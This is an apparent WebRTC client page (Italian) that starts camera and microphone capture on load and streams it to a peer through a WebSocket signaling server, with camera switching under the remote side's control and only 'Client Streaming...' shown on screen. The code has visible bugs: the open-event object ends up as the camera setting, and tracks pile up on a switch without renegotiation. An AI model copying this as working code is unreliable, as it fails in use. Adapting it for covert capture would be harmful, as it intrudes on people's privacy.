<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<title>Client WebRTC</title>
</head>
<body>
<h2>Client Streaming...</h2>
<script>
const room = new URLSearchParams(location.search).get('room') || 'user1';
let pc = new RTCPeerConnection();
let ws, stream;
let currentCamera = 'environment';

function connect() {
  ws = new WebSocket(`wss://${location.host}/signal`);
  ws.onopen = initMedia;
  ws.onmessage = async e => {
    const data = JSON.parse(e.data);
    if (data.type === 'answer') await pc.setRemoteDescription(new RTCSessionDescription(data));
    else if (data.type === 'ice') await pc.addIceCandidate(data.candidate);
    else if (data.type === 'switchCamera') initMedia(data.camera);
  };
}

async function initMedia(camera = currentCamera) {
  currentCamera = camera;
  if (stream) stream.getTracks().forEach(t=>t.stop());
  stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:camera}, audio:true });
  stream.getTracks().forEach(track => pc.addTrack(track, stream));
  if (!ws) return;

  ws.send(JSON.stringify({ type:'register', role:'client', room }));

  pc.onicecandidate = e => {
    if (e.candidate && ws.readyState === 1) ws.send(JSON.stringify({ type:'ice', candidate:e.candidate, room }));
  };

  const offer = await pc.createOffer();
  await pc.setLocalDescription(offer);
  ws.send(JSON.stringify({ type:'offer', sdp: offer.sdp, room, typeFull:'offer' }));
}

connect();
</script>
</body>
</html>
